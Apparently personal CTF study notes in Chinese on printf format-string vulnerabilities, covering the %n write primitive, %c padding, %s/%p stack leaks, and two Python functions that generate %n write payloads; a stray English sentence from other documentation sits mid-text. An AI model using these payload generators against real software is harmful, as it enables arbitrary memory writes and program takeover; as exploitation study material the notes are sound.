# printf函数


`printf(fmt, a1, a2, a3, a4, a5, a6, ...)`

其参数对应寄存器为：

0. `fmt` → `RDI`
1. `a1` → `RSI`
2. `a2` → `RDX`
3. `a3` → `RCX`
4. `a4` → `R8`
5. `a5` → `R9`
6. `stack...`

# %n写原语

`%n`：会将对应参数位置作为地址，写入已经打印的字符串长度，可以选择写入1（%hhn）、2（%hn）、4（%n）bytes

其写入有两种模式：
	*所有fmt都有这两种模式*

1. `%参数序数$n`positional 模式
	positional 模式，printf 会先解析格式串，把 `%8$...、%16$... `这些对应的参数，提前收集到`printf`函数内部参数表里，之后统一进行处理。

2. `%n`non_positional 模式
	non_positional 模式,printf会按顺序，挨个解析对应参数，并进行处理。

3. 混用：属于glibc库中的未定义行为，不同版本使用现象不同，会造成利用不稳定情况。

其写入时，写入的是已经打印的字符串的长度，考虑到大部分 fmt vuln 的可写入长度并没有那么长，所以引入另一个机制：`%c`

这个 fmt 会打印一个 char ，当使用`%数字c`时，它会打印`(数字 - 1)`个空白字符，一个对应参数的 char ，通过这个方式，可以减少需要写入的字符长度。

*这里还要注意的是：尽量不要通过 `%n` 进行写入，这个原语会宝掉io流的上下文，导致程序运行异常（因为用这个往往需要打印大量空白字符），当然有些时候可以使用，比如：non_positional 下，向最先写入写入的地址写一个比较小的数，或者用于清零最先写入的地址；positional 下，向任意参数写入小数或用于清零（注意要将想用`%n`写入的放在最开始的位置）*

以上的原因，手搓过 fmt_payload 之后，就很容易理解，但是手搓终究是痛苦的，所以写了以下 payload 生成函数：

```python
def fmt_n_position(parts, len_limi, start_written=0):
    payload = b""
    written = start_written

    for argno, value, size in parts:
        if size == 1:
            mod = 0x100
            spec = "hhn"
        elif size == 2:
            mod = 0x10000
            spec = "hn"
        elif size == 4:
            mod = 0x100000000
            spec = "n"
        else:
            raise ValueError(size)

        value &= (mod - 1)  # 只取低位

        delta = (value - written) % mod
        if delta:
            if delta <= 2:
                payload += b"z" * delta
                written += delta
            else:
                payload += f"%{delta}c".encode()
                written += delta
        payload += f"%{argno}${spec}".encode()

    if len(payload) > len_limi:
        raise RuntimeError("payload is too lang")

    return payload.ljust(len_limi, b"z")


def fmt_n_base(parts, len_limi=0x100, start_written=0, pad_byte=b"z", auto_sort=True):
    def parse_argno(x):
        return int(x, 0) if isinstance(x, str) else int(x)

    spec_map = {
        1: (0x100, "hhn"),
        2: (0x10000, "hn"),
        4: (0x100000000, "n"),
    }

    if auto_sort:
        parts = sorted(parts, key=lambda item: parse_argno(item[0]))

    payload = b""
    written = start_written
    next_arg = 1

    for raw_argno, value, size in parts:
        argno = parse_argno(raw_argno)

        if size not in spec_map:
            raise ValueError(f"bad write size: {size}")

        mod, spec = spec_map[size]

        value &= (mod - 1)  # 只取低位

        if argno < next_arg:
            raise RuntimeError(
                f"arg{argno} has already been consumed; current next_arg is arg{next_arg}"
            )

        gap = argno - next_arg

        if gap == 0:
            delta = (value - written) % mod
            payload += pad_byte * delta
            written += delta
            payload += f"%{spec}".encode()
            next_arg += 1
        else:
            consume = gap - 1
            payload += b"%c" * consume
            written += consume
            next_arg += consume

            delta = (value - written) % mod
            if delta == 0:
                delta = mod

            payload += f"%{delta}c%{spec}".encode()
            written += delta
            next_arg += 2

    if len(payload) > len_limi:
        raise RuntimeError(f"payload is too long: {len(payload)} > {len_limi}")

    return payload.ljust(len_limi, pad_byte)
```

    The overflows argument is a format-string-length to output-amount tradeoff:
    Larger values for ``overflows`` produce shorter format strings that generate more output at runtime.

# %s、%p读原语

一般只用positional模式，直接泄露栈上对应位置的数据。

%p 打印时会打印地址的**数字字符串**，用`int(rn(14), 16)`接收

%s 打印时会**将地址解析成字符串**，用`uu64(rn(6))`接收

%s在遇到`\0`时才会停止打印，这也是一种泄露方式。
